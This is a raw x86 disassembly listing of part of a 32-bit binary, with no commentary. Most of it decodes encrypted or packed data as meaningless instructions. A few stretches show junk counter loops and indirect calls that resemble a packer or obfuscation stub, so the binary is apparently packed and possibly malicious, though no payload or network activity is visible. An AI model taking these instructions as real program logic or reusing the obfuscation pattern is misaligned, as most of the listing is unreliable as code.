  40a13b:	push   ss
  40a13c:	ror    ch,cl
  40a13e:	(bad)  
  40a13f:	mov    dh,0xa2
  40a141:	and    eax,ecx
  40a143:	daa    
  40a144:	inc    eax
  40a145:	dec    edi
  40a146:	sbb    DWORD PTR [ebx],ebp
  40a148:	or     BYTE PTR [ebx],ch
  40a14a:	mov    ebx,0x28b6c3b1
  40a14f:	test   al,dh
  40a151:	xchg   esi,eax
  40a152:	dec    eax
  40a153:	xchg   ebp,eax
  40a154:	jg     0x40a146
  40a156:	cwde   
  40a157:	sub    dh,BYTE PTR [edi+esi*4+0x2204d330]
  40a15e:	jmp    0x430a:0x41995ca2
  40a165:	retf   0xc70
  40a168:	mov    al,ds:0xb3cd6018
  40a16d:	xor    al,0xae
  40a16f:	mov    ch,0x4a
  40a171:	and    eax,0xffbb9273
  40a176:	mov    dh,BYTE PTR [ecx+0x193b0a4f]
  40a17c:	or     DWORD PTR [edx-0x26],0xf82aa6fd
  40a183:	call   0x8dbd200e
  40a188:	and    DWORD PTR [ebx],ebx
  40a18a:	out    0x49,eax
  40a18c:	inc    edx
  40a18d:	cmc    
  40a18e:	popf   
  40a18f:	inc    ecx
  40a190:	es pop esi
  40a192:	lds    edi,FWORD PTR [edx+edx*1]
  40a195:	and    ebx,edx
  40a197:	jae    0x40a1b8
  40a199:	call   0xa511:0x75f2edf6
  40a1a0:	push   ebx
  40a1a1:	inc    edi
  40a1a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1a3:	jge    0x40a189
  40a1a5:	xor    DWORD PTR [esi+0x61],edi
  40a1a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1a9:	stos   DWORD PTR es:[edi],eax
  40a1aa:	jne    0x40a1f7
  40a1ac:	loopne 0x40a202
  40a1ae:	in     eax,0x44
  40a1b0:	push   0x7a
  40a1b2:	mov    cs,WORD PTR ds:0xae37ab6
  40a1b8:	aaa    
  40a1b9:	iret   
  40a1ba:	popa   
  40a1bb:	ins    DWORD PTR es:[edi],dx
  40a1bc:	jp     0x40a158
  40a1be:	jae    0x40a17c
  40a1c0:	mov    edi,eax
  40a1c2:	lds    ecx,FWORD PTR [edx-0x44012f41]
  40a1c8:	aam    0xab
  40a1ca:	push   edi
  40a1cb:	mov    eax,0x77600a48
  40a1d0:	ret    0x2416
  40a1d3:	sub    dh,ch
  40a1d5:	rcl    DWORD PTR [edi-0x57],cl
  40a1d8:	mov    BYTE PTR [edx],bl
  40a1da:	or     eax,DWORD PTR [eax-0x51c24883]
  40a1e0:	std    
  40a1e1:	sub    bh,BYTE PTR [ebp+0x37ec94d0]
  40a1e7:	dec    edx
  40a1e8:	sbb    al,0x4c
  40a1ea:	out    dx,eax
  40a1eb:	adc    BYTE PTR [ecx+edx*4-0x4195752],ch
  40a1f2:	not    BYTE PTR ds:[edx+0x4189550f]
  40a1f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1fa:	mov    ds:0xf08f331e,al
  40a1ff:	call   0x8e2e0e1c
  40a204:	fldenv [edx+0x22bde9a2]
  40a20a:	xchg   ebx,eax
  40a20b:	fsubrp st(4),st
  40a20d:	pop    esi
  40a20e:	cwde   
  40a20f:	xor    eax,0xbcbb6db9
  40a214:	pop    esi
  40a215:	push   ds
  40a216:	popa   
  40a217:	adc    edx,esi
  40a219:	mov    ebx,0x666790c4
  40a21e:	mov    edx,eax
  40a220:	sub    al,0xbc
  40a222:	mov    edx,0xbdf55619
  40a227:	mov    edx,0x3ad2cf43
  40a22c:	hlt    
  40a22d:	adc    bh,al
  40a22f:	inc    ebp
  40a230:	cld    
  40a231:	rol    DWORD PTR [ebp+0x45c7f89c],1
  40a237:	fdiv   DWORD PTR [ebx]
  40a239:	test   DWORD PTR [eax+edi*8+0x45c7d213],ebx
  40a240:	aam    0x32
  40a242:	test   DWORD PTR [eax+edi*8-0x312da7f],ebx
  40a249:	inc    edx
  40a24a:	add    BYTE PTR [eax],al
  40a24c:	add    BYTE PTR [eax],al
  40a24e:	add    cl,ch
  40a250:	sldt   WORD PTR [eax]
  40a253:	add    BYTE PTR [ebx],dh
  40a255:	ror    BYTE PTR [ebx],cl
  40a257:	adc    eax,0x42fced
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fced,edx
  40a263:	cmp    DWORD PTR ds:0x42fced,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fced,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e2e7
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e128,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e70f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	mov    esp,0x456765bd
  40a2c9:	cmc    
  40a2ca:	jo     0x40a33c
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a2f6
  40a2d1:	add    al,0x24
  40a2d3:	push   es
  40a2d4:	daa    
  40a2d5:	mov    fs,WORD PTR [ecx+0x4b]
  40a2d8:	cmp    ebp,DWORD PTR [edx+0x2ce2858f]
  40a2de:	mov    bh,0xa6
  40a2e0:	xor    DWORD PTR [esi+0x77],esp
  40a2e3:	or     bh,BYTE PTR [ebx]
  40a2e5:	push   0x5d
  40a2e7:	aad    0xc2
  40a2e9:	lock cmc 
  40a2eb:	mov    dl,0x2
  40a2ed:	xor    BYTE PTR [edx],bh
  40a2ef:	sub    BYTE PTR [esi],bh
  40a2f1:	adc    dh,ah
  40a2f3:	popa   
  40a2f4:	cmp    edx,edx
  40a2f6:	fst    DWORD PTR [ebx+edi*2+0x7f362fde]
  40a2fd:	push   cs
  40a2fe:	gs push ebp
  40a300:	sahf   
  40a301:	imul   edi,DWORD PTR [edx-0x2fc2f345],0x78a9f35b
  40a30b:	and    eax,0x135be7bb
  40a310:	cmp    ah,BYTE PTR fs:[esi+0x70]
  40a314:	sub    esp,DWORD PTR cs:0xafbb1ca0
  40a31b:	leave  
  40a31c:	(bad)  
  40a31d:	mov    eax,ds:0x26454010
  40a322:	add    DWORD PTR [edx-0x7],edx
  40a325:	pop    eax
  40a326:	icebp  
  40a327:	popf   
  40a328:	mov    al,0xc6
  40a32a:	pop    esp
  40a32b:	adc    eax,0x9b3412c4
  40a330:	dec    ebp
  40a331:	jo     0x40a365
  40a333:	xchg   ebp,eax
  40a334:	xchg   ebp,eax
  40a335:	xlat   BYTE PTR ds:[ebx]
  40a336:	fs and al,0xc0
  40a339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a33a:	fs ja  0x40a2fb
  40a33d:	adc    eax,0xe824190d
  40a342:	inc    edi
  40a343:	jg     0x40a3ba
  40a345:	shr    DWORD PTR [ecx],cl
  40a347:	push   0x82375ddd
  40a34c:	fdiv   DWORD PTR [ebx-0x20]
  40a34f:	mov    ebp,0x2e626820
  40a354:	adc    esi,0x30
  40a357:	popf   
  40a358:	add    dl,BYTE PTR [edi-0x7a2f136b]
  40a35e:	jne    0x40a359
  40a360:	imul   ebp,DWORD PTR [ebx],0x23
  40a363:	lock push 0x45c800e8
  40a369:	or     eax,0x2c5427c0
  40a36e:	pop    ebx
  40a36f:	fisttp WORD PTR [esi+0x225f3428]
  40a375:	xor    al,0xf3
  40a377:	fwait
  40a378:	cmp    al,0x68
  40a37a:	sbb    eax,0x63e52f27
  40a37f:	xor    edx,DWORD PTR [edx+0x42a34abd]
  40a385:	pop    esi
  40a386:	jmp    0x40a325
  40a388:	rcr    ch,cl
  40a38a:	add    ch,BYTE PTR [eax+edx*8+0x3a]
  40a38e:	push   ecx
  40a38f:	ror    BYTE PTR [ebp-0x30],0x20
  40a393:	lahf   
  40a394:	mov    esi,0xd2fcc8c9
  40a399:	sbb    ch,cl
  40a39b:	and    edi,DWORD PTR [esi+0x6]
  40a39e:	lahf   
  40a39f:	mov    ecx,0x350377a7
  40a3a4:	fwait
  40a3a5:	adc    ecx,ebx
  40a3a7:	mov    cl,0xb3
  40a3a9:	pop    eax
  40a3aa:	nop
  40a3ab:	pop    edx
  40a3ac:	cmc    
  40a3ad:	sbb    BYTE PTR [edi+0x40],ch
  40a3b0:	jmp    ebp
  40a3b2:	in     eax,0xd9
  40a3b4:	mov    WORD PTR [ecx+0x5],fs
  40a3b7:	dec    esi
  40a3b8:	repnz sub ch,bh
  40a3bb:	push   0xffffffeb
  40a3bd:	dec    esp
  40a3be:	retf   0xea5
  40a3c1:	jo     0x40a38c
  40a3c3:	or     cl,0x62
  40a3c6:	imul   eax,ecx,0xe0d3eae4
  40a3cc:	jg     0x40a3b6
  40a3ce:	outs   dx,BYTE PTR ds:[esi]
  40a3cf:	pusha  
  40a3d0:	xchg   esp,eax
  40a3d1:	jo     0x40a3a9
  40a3d3:	shr    bh,1
  40a3d5:	loopne 0x40a429
  40a3d7:	adc    eax,0xc7061a4e
  40a3dc:	mov    ch,0x4b
  40a3de:	fnstsw WORD PTR [ebx+0x66]
  40a3e1:	dec    eax
  40a3e2:	ins    BYTE PTR es:[edi],dx
  40a3e3:	mov    esi,0xa95a154f
  40a3e8:	pop    ds
  40a3e9:	push   0xe888f6b3
  40a3ee:	dec    edx
  40a3ef:	test   BYTE PTR [eax+0x52],ah
  40a3f2:	xchg   edi,eax
  40a3f3:	cdq    
  40a3f4:	daa    
  40a3f5:	mov    dl,0x8b
  40a3f7:	xchg   ecx,esp
  40a3f9:	adc    al,0xec
  40a3fc:	test   BYTE PTR [eax+0x5b05875b],dl
  40a402:	dec    esp
  40a403:	lods   al,BYTE PTR ds:[esi]
  40a404:	jg     0x40a47b
  40a406:	stc    
  40a407:	mov    ss,WORD PTR [ebx+0x5b]
  40a40a:	dec    esi
  40a40b:	lahf   
  40a40c:	push   0x55ac66b4
  40a411:	push   ebp
  40a412:	mov    fs,ebp
  40a414:	lock push esi
  40a416:	add    al,0x66
  40a418:	int    0x29
  40a41a:	imul   ebp,ebx,0xffffffb5
  40a41d:	push   es
  40a41e:	jo     0x40a3f4
  40a420:	xchg   ebx,eax
  40a421:	cld    
  40a422:	mov    dh,dh
  40a424:	pop    edi
  40a425:	jge    0x40a3b0
  40a427:	jne    0x40a453
  40a429:	int3   
  40a42a:	arpl   bx,si
  40a42c:	adc    al,0x68
  40a42e:	aas    
  40a42f:	mov    ah,0xc6
  40a431:	add    BYTE PTR [eax],0x62
  40a434:	adc    ebp,ecx
  40a436:	push   esp
  40a437:	mov    WORD PTR [ebx],gs
  40a439:	inc    edx
  40a43a:	test   al,0x5f
  40a43c:	adc    BYTE PTR [ebx-0x7e],ah
  40a43f:	dec    eax
  40a440:	leave  
  40a441:	bound  ecx,QWORD PTR [edx+0x49d9d7f1]
  40a447:	sti    
  40a448:	push   ebp
  40a449:	adc    al,0xa2
  40a44b:	push   edi
  40a44c:	sub    DWORD PTR [ebx+ebx*4+0x2e540d8a],0xffffff89
  40a454:	push   ds
  40a455:	jecxz  0x40a440
  40a457:	lds    edx,FWORD PTR [ebx+0x5]
  40a45a:	pushf  
  40a45b:	pop    ebx
  40a45c:	xor    ecx,esp
  40a45e:	push   edx
  40a45f:	sub    DWORD PTR [ecx],eax
  40a461:	inc    ebp
  40a462:	push   es
  40a463:	jns    0x40a41b
  40a465:	xchg   ebp,eax
  40a466:	xchg   DWORD PTR [esi-0xeb2df07],edx
  40a46c:	dec    ebx
  40a46d:	push   edi
  40a46e:	popa   
  40a46f:	mov    eax,ds:0x100a46d7
  40a474:	pop    ss
  40a475:	imul   DWORD PTR [eax]
  40a477:	add    al,BYTE PTR [edi+edx*4-0x3f]
  40a47b:	repnz mov dl,0x2f
  40a47e:	or     al,0x1b
  40a480:	shl    DWORD PTR [ecx+0x10ed79c2],cl
  40a486:	adc    esi,esi
  40a488:	fisubr DWORD PTR ss:[ebx]
  40a48b:	mov    dh,0x55
  40a48d:	scas   al,BYTE PTR es:[edi]
  40a48e:	(bad)  
  40a491:	repnz cmc 
  40a493:	stc    
  40a494:	xlat   BYTE PTR ds:[ebx]
  40a495:	push   ecx
  40a496:	sar    BYTE PTR [eax],1
  40a498:	pop    eax
  40a499:	(bad)
  40a49c:	ja     0x40a439
  40a49e:	sub    cl,0xa4
  40a4a1:	and    edx,esi
  40a4a3:	or     eax,0xe95ef9da
  40a4a8:	cmp    dl,bh
  40a4aa:	stos   BYTE PTR es:[edi],al
  40a4ab:	shl    ecx,cl
  40a4ad:	or     BYTE PTR [ebx+0x12518d33],ch
  40a4b3:	das    
  40a4b4:	mov    cl,0x20
  40a4b6:	and    BYTE PTR [ebp-0x54d26200],dh
  40a4bc:	xchg   edx,eax
  40a4bd:	jns    0x40a4e5
  40a4bf:	mov    ds:0xc00ff0ef,eax
  40a4c4:	lods   al,BYTE PTR ds:[esi]
  40a4c5:	inc    BYTE PTR [edx-0x4436aff6]
  40a4cb:	test   eax,0x4f09cc50
  40a4d0:	stos   BYTE PTR es:[edi],al
  40a4d1:	hlt    
  40a4d2:	(bad)  
  40a4d3:	mov    esp,0xa01fe08a
  40a4d8:	cmp    al,0xef
  40a4da:	dec    esi
  40a4db:	pop    ecx
  40a4dc:	std    
  40a4dd:	outs   dx,BYTE PTR ds:[esi]
  40a4de:	or     edx,esp
  40a4e0:	mov    ah,0x47
  40a4e2:	nop
  40a4e3:	stos   DWORD PTR es:[edi],eax
  40a4e4:	mov    ds:0xc4457461,eax
  40a4e9:	mov    ecx,0x6788694b
  40a4ee:	pop    eax
  40a4ef:	add    eax,0x816768fc
  40a4f4:	ins    DWORD PTR es:[edi],dx
  40a4f5:	mov    edx,0xe63b0538
  40a4fa:	(bad)  
  40a4fc:	cmp    al,0xd3
  40a4fe:	mov    ch,0x4d
  40a500:	mov    edi,0x47a0df40
  40a505:	test   eax,0x95aab939
  40a50a:	inc    ebp
  40a50b:	push   ebx
  40a50c:	dec    ebx
  40a50d:	into   
  40a50e:	adc    eax,DWORD PTR [ebx+0x2b]
  40a511:	mov    ecx,0x82ab7aaa
  40a516:	mov    ebx,0x93dbc3d0
  40a51b:	fld    TBYTE PTR [ebx-0x51]
  40a51e:	pushf  
  40a51f:	leave  
  40a520:	push   edx
  40a521:	add    al,0x88
  40a523:	ja     0x40a565
  40a525:	sub    eax,0x4f901e1
  40a52a:	mov    eax,ds:0xcb481750
  40a52f:	cld    
  40a530:	shl    edi,1
  40a532:	cmc    
  40a533:	gs pop esi
  40a535:	push   0xffffffa9
  40a537:	cwde   
  40a538:	ret    
  40a539:	inc    ebx
  40a53a:	inc    esi
  40a53b:	mov    esi,0x1a60d4e1
  40a540:	loopne 0x40a571
  40a542:	(bad)  
  40a544:	inc    esp
  40a545:	sub    eax,0xb2efa112
  40a54a:	sbb    ecx,DWORD PTR [esi-0x5c9ad74f]
  40a550:	push   esp
  40a551:	jns    0x40a50d
  40a553:	cmp    ecx,DWORD PTR [ecx]
  40a555:	jle    0x40a5d1
  40a557:	std    
  40a558:	fisubr DWORD PTR [ecx-0x7bc7b181]
  40a55e:	ins    DWORD PTR es:[edi],dx
  40a55f:	dec    edx
  40a560:	mov    cl,BYTE PTR [eax+0x4]
  40a563:	xchg   ebp,eax
  40a564:	call   FWORD PTR ds:0x4759037a
  40a56a:	(bad)  
  40a56b:	push   edi
  40a56c:	inc    edi
  40a56d:	lds    edi,FWORD PTR [edi+0x27a16b2b]
  40a573:	mov    eax,ds:0xba53099d
  40a578:	mov    ah,0xda
  40a57a:	je     0x40a5b9
  40a57c:	xor    ecx,DWORD PTR [ebp+0x1d]
  40a57f:	out    0x4c,eax
  40a581:	rol    DWORD PTR [edi],cl
  40a583:	pusha  
  40a584:	dec    esp
  40a585:	sub    DWORD PTR fs:[ebx+0x34],edi
  40a589:	push   cs
  40a58a:	mov    WORD PTR [ecx],cs
  40a58c:	call   0x1b54:0x1770006f
  40a593:	or     cl,BYTE PTR [ebx+ebx*2+0x75531d35]
  40a59a:	inc    edi
  40a59b:	adc    BYTE PTR [ecx+0x2aef30e],cl
  40a5a1:	imul   ebx,DWORD PTR [edi+0x10df4b70],0x6963e9c7
  40a5ab:	mov    edi,0x3a4eeb3c
  40a5b0:	or     edi,DWORD PTR [edx]
  40a5b2:	add    DWORD PTR [eax+0x60],ecx
  40a5b5:	adc    DWORD PTR [ebp-0x227a3c35],esp
  40a5bb:	xchg   BYTE PTR ds:0x791399ef,bl
  40a5c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5c2:	das    
  40a5c3:	dec    DWORD PTR [esi]
  40a5c5:	and    eax,0x484849e7
  40a5ca:	xabort 0x60
  40a5cd:	and    dl,BYTE PTR [edi]
  40a5cf:	ret    
  40a5d0:	fstp   DWORD PTR [ebp+esi*8-0x64]
  40a5d4:	fisubr WORD PTR [ebx]
  40a5d6:	cwde   
  40a5d7:	jbe    0x40a56d
  40a5d9:	pop    ebx
  40a5da:	pushf  
  40a5db:	cmp    eax,0xdc310a4e
  40a5e0:	or     dl,BYTE PTR [esi-0x1]
  40a5e3:	mov    WORD PTR [esi],cs
  40a5e5:	pop    edx
  40a5e6:	jecxz  0x40a657
  40a5e8:	pop    ebx
  40a5e9:	(bad)  
  40a5ea:	popf   
  40a5eb:	imul   esi,DWORD PTR ds:0xe86fb5fa,0x35
  40a5f2:	dec    ebp
  40a5f3:	jmp    0x40a57a
  40a5f5:	dec    ebx
  40a5f6:	das    
  40a5f7:	sar    DWORD PTR [ecx],0xac
  40a5fa:	outs   dx,BYTE PTR ds:[esi]
  40a5fb:	pusha  
  40a5fc:	or     ch,BYTE PTR [ebp-0x1a67247a]
  40a602:	pop    ecx
  40a603:	push   edx
  40a604:	mov    dl,0xcd
  40a606:	cmp    DWORD PTR [edx-0x4e],0xffffffc2
  40a60a:	cmp    eax,0x9e98a4c7
  40a60f:	ins    BYTE PTR es:[edi],dx
  40a610:	in     al,0xf1
  40a612:	and    edx,DWORD PTR [ebx]
  40a614:	and    bh,dh
  40a616:	jmp    0x1ac9449c
  40a61b:	in     eax,dx
  40a61c:	pop    ebx
  40a61d:	aad    0x44
  40a61f:	push   cs
  40a620:	out    dx,eax
  40a621:	ja     0x40a5f9
  40a623:	leave  
  40a624:	lea    edx,[esi+0x67]
  40a627:	push   esi
  40a628:	mov    ch,ah
  40a62a:	sub    DWORD PTR [eax],esi
  40a62c:	pop    ebp
  40a62d:	ror    BYTE PTR [eax-0x6e618141],1
  40a633:	das    
  40a634:	sar    BYTE PTR [esi],1
  40a636:	inc    ebp
  40a637:	mov    ds:0x97c224e0,eax
  40a63c:	jnp    0x40a68e
  40a63e:	inc    edx
  40a63f:	inc    edi
  40a640:	sbb    al,0xb1
  40a642:	imul   eax,DWORD PTR ds:0xdfe3abb,0xf3fa81de
  40a64c:	or     BYTE PTR [ebx+0x1e],bh
  40a64f:	xlat   BYTE PTR ds:[ebx]
  40a650:	adc    eax,0x107362a9
  40a655:	jp     0x40a5f5
  40a657:	js     0x40a68b
  40a659:	add    DWORD PTR [esi+0x74],ecx
  40a65c:	or     BYTE PTR [edx],bl
  40a65e:	sahf   
  40a65f:	and    DWORD PTR [ebp-0x4d],esp
  40a662:	xchg   edx,eax
  40a663:	in     al,dx
  40a664:	add    BYTE PTR [ebx-0x45e80c93],0xc4
  40a66b:	dec    edx
  40a66c:	in     al,0x92
  40a66e:	into   
  40a66f:	jnp    0x40a677
  40a671:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e6ef,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e6ef
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e6ef,edx
  40a698:	cmp    DWORD PTR ds:0x42e6ef,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e6f7
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e2eb
  40a6c6:	cmp    DWORD PTR ds:0x42e6ef,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e6ef
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e6ef,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e6ef,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fcdd,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fcdd
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fcdd,edx
  40a709:	cmp    DWORD PTR ds:0x42fcdd,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fcdd,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e26d
  40a728:	push   0x42e25b
  40a72d:	call   DWORD PTR ds:0x42e547
  40a733:	cmp    DWORD PTR ds:0x42fcdd,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fcdd
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fcdd,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e134
  40a75a:	xor    edi,DWORD PTR ds:0x42e713
  40a760:	mov    DWORD PTR ds:0x42e134,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e713,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fcd1
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fce5,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e713,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fcf9,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fd09,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e130,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e130,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e130,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e1e7
  40a7e8:	push   0x42e23d
  40a7ed:	push   0x42e23d
  40a7f2:	call   DWORD PTR ds:0x42e2ef
  40a7f8:	cmp    DWORD PTR ds:0x42e130,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e130
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e130,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e130
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e130,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e12c,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fd6e
  40a839:	add    DWORD PTR ds:0x42e707,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	jmp    0xe46190ab
  40a858:	icebp  
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a7ff
  40a860:	(bad)  [eax-0x4c]
  40a863:	in     eax,dx
  40a864:	mov    ebx,DWORD PTR [eax-0x17]
  40a867:	(bad)  
  40a868:	mov    bh,0xda
  40a86a:	xor    eax,DWORD PTR [edi-0x664fa7eb]
  40a870:	rcr    DWORD PTR [ebx],0x6d
  40a873:	clc    
  40a874:	popa   
  40a875:	adc    DWORD PTR [esi+0x6d],0xffffffeb
  40a879:	icebp  
  40a87a:	xchg   edi,eax
  40a87b:	ins    BYTE PTR es:[edi],dx
  40a87c:	pop    ebx
  40a87d:	jmp    0x40a8b3
  40a87f:	es push ds
  40a881:	push   es
  40a882:	adc    BYTE PTR [esi+0x332db7ab],dl
  40a888:	pop    edi
  40a889:	xchg   esi,eax
  40a88a:	ret    0x41b1
  40a88d:	mov    eax,ds:0xba796b64
  40a892:	add    al,BYTE PTR [ebp+0x61]
  40a895:	das    
  40a896:	cmovle edi,ebx
  40a899:	cmp    al,0x60
  40a89b:	mov    esp,0x3f37c095
  40a8a0:	jmp    0x2a68:0xf8426d6b
  40a8a7:	int    0x45
  40a8a9:	sbb    BYTE PTR fs:[edx+eax*2],ah
  40a8ad:	add    dl,dl
  40a8af:	ret    
  40a8b0:	dec    edi
  40a8b1:	pop    esi
  40a8b2:	dec    eax
  40a8b3:	push   ds
  40a8b4:	ficom  DWORD PTR [edx-0x49]
  40a8b7:	xor    DWORD PTR [ecx+edx*4+0x17],edi
  40a8bb:	jmp    0x5cc6:0xb037f963
  40a8c2:	jmp    0x59a6:0x50af8d6c
  40a8c9:	mul    BYTE PTR [ebx+edx*1-0x2dc46331]
  40a8d0:	xor    ebp,DWORD PTR [eax+ebp*4-0x9e48d24]
  40a8d7:	call   0x22a6:0xa53f4177
  40a8de:	test   DWORD PTR [ebp-0x1cc413c0],esi
  40a8e4:	sbb    DWORD PTR [edi],edx
  40a8e6:	push   edi
  40a8e7:	jle    0x40a965
  40a8e9:	neg    DWORD PTR [edx-0x28]
  40a8ec:	jb     0x40a92a
  40a8ee:	xor    eax,0xb707f747
  40a8f3:	jmp    0xc60d7d65
  40a8f8:	sbb    DWORD PTR [eax-0x62],0xbe8e8874
  40a8ff:	out    0x15,al
  40a901:	jp     0x40a8c5
  40a903:	mov    ah,BYTE PTR [edi-0x1ebb756f]
  40a909:	icebp  
  40a90a:	jp     0x40a90b
  40a90c:	inc    edi
  40a90d:	pop    edx
  40a90e:	pusha  
  40a90f:	adc    ah,BYTE PTR [edi-0x25]
  40a912:	out    dx,eax
  40a913:	xchg   DWORD PTR [eax-0x13],edx
  40a916:	aad    0xe
  40a918:	or     cl,BYTE PTR [ecx-0x71]
  40a91b:	mov    DWORD PTR [esp+edx*4+0x4b61c4c6],ebx
  40a922:	push   es
  40a923:	sub    eax,0x2e9b6ef2
  40a928:	cli    
  40a929:	xchg   ebx,eax
  40a92a:	aam    0x8f
  40a92c:	and    al,0x8a
  40a92e:	lock jp 0x40a971
  40a931:	and    edi,DWORD PTR [eax+edx*1-0x3c]
  40a935:	ret    
  40a936:	sbb    BYTE PTR [edx-0x576ca9fe],dh
  40a93c:	push   0xec5c4655
  40a941:	pusha  
  40a942:	out    0x38,eax
  40a944:	or     eax,0x62e03e1f
  40a949:	fldcw  WORD PTR [esi+0x53]
  40a94c:	mov    ebx,eax
  40a94e:	sub    ebx,DWORD PTR [edi]
  40a950:	ins    DWORD PTR es:[edi],dx
  40a951:	imul   edi,DWORD PTR [edx+ebp*1+0x35],0xffffff9e
  40a956:	pushf  
  40a957:	mov    eax,0x90fc005d
  40a95c:	inc    ebx
  40a95d:	mov    dh,0xd
  40a95f:	in     eax,dx
  40a960:	ss in  al,0x1a
  40a963:	shl    esp,cl
  40a965:	leave  
  40a966:	pop    edi
  40a967:	mov    ds:0xa6c85aef,al
  40a96c:	rdtsc  
  40a96e:	cmp    bl,BYTE PTR [ecx-0x49]
  40a971:	pop    es
  40a972:	adc    eax,0xcdb143e2
  40a977:	and    bl,dl
  40a979:	sub    BYTE PTR [ebp+edi*8-0x4f],bh
  40a97d:	gs dec esp
  40a97f:	inc    edi
  40a980:	jg     0x40a944
  40a982:	int    0xe
  40a984:	xchg   esp,eax
  40a985:	sbb    bh,BYTE PTR [ebx-0x2d]
  40a988:	pop    ebp
  40a989:	lea    ecx,[ebx+0x1]
  40a98c:	retf   
  40a98d:	fs aad 0x77
  40a990:	aam    0x48
  40a992:	adc    dh,bh
  40a994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a995:	icebp  
  40a996:	call   0x4414:0xfe41eee2
  40a99d:	(bad)
  40a9a0:	or     bh,ah
  40a9a2:	arpl   WORD PTR [esi+0x3af7a5c9],ax
  40a9a8:	xor    edi,DWORD PTR [ebx-0x69915767]
  40a9ae:	mov    ch,0x66
  40a9b0:	ret    0x4597
  40a9b3:	and    al,0x8f
  40a9b5:	and    DWORD PTR [eax-0x6a],ebx
  40a9b8:	or     DWORD PTR [edi],0x71329bca
  40a9be:	xchg   edi,eax
  40a9bf:	test   BYTE PTR [edx-0x64],ah
  40a9c2:	aam    0x6c
  40a9c4:	loopne 0x40aa01
  40a9c6:	dec    esp
  40a9c7:	jmp    0x1ff7ea0e
  40a9cc:	lods   eax,DWORD PTR ds:[esi]
